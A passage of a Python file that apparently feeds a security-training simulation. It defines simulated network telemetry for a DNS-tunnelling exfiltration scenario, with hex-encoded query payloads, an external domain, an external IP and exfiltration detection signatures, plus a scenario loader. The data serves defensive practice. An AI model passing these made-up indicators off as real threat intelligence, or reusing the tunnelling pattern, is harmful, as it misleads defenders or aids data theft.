            affected_node_ids=["corp_dns_resolver", "authoritative_dns"],
            ioc_indicators=["High Query Rate: 120 qps", "Total Exfiltrated: 12.8 MB"],
            action_type="exfiltration"
        ),
    ]

    packets = [
        PacketTelemetry(
            id="pb_pkt_1",
            timestamp_tick=1,
            source_id="rnd_workstation",
            source_ip="10.10.40.88",
            target_id="corp_dns_resolver",
            target_ip="10.10.1.2",
            protocol="DNS",
            port=53,
            payload_preview="DNS Query A: a8f9c102.b4.c2-sync.darkmatter-intel.org",
            payload_raw="0001010000010000000000000861386639633130320262340763322d73796e63106461726b6d61747465722d696e74656c036f72670000010001",
            is_malicious=True,
            threat_signature="SIG-DNS-TUNNEL-BEACON",
            entropy=7.74,
            bytes_transferred=512
        ),
        PacketTelemetry(
            id="pb_pkt_2",
            timestamp_tick=4,
            source_id="corp_dns_resolver",
            source_ip="10.10.1.2",
            target_id="authoritative_dns",
            target_ip="193.106.191.82",
            protocol="DNS",
            port=53,
            payload_preview="DNS Query TXT (EXFIL CHUNK #89): 7x9a8f4c2e1b.exfil.darkmatter-intel.org",
            payload_raw="3778396138663463326531622e657866696c2e6461726b6d61747465722d696e74656c2e6f7267",
            is_malicious=True,
            threat_signature="SIG-DNS-TUNNEL-EXFIL",
            entropy=7.91,
            bytes_transferred=1024
        ),
    ]

    return meta, nodes, edges, events, packets


ALL_SCENARIO_LOADERS = {
    "red_eclipse": get_operation_red_eclipse,
    "blackbasta": get_blackbasta_ransomware,
    "phantombeacon": get_phantom_beacon,
}


def load_scenario(scenario_id: str):
    loader = ALL_SCENARIO_LOADERS.get(scenario_id, get_operation_red_eclipse)
    return loader()
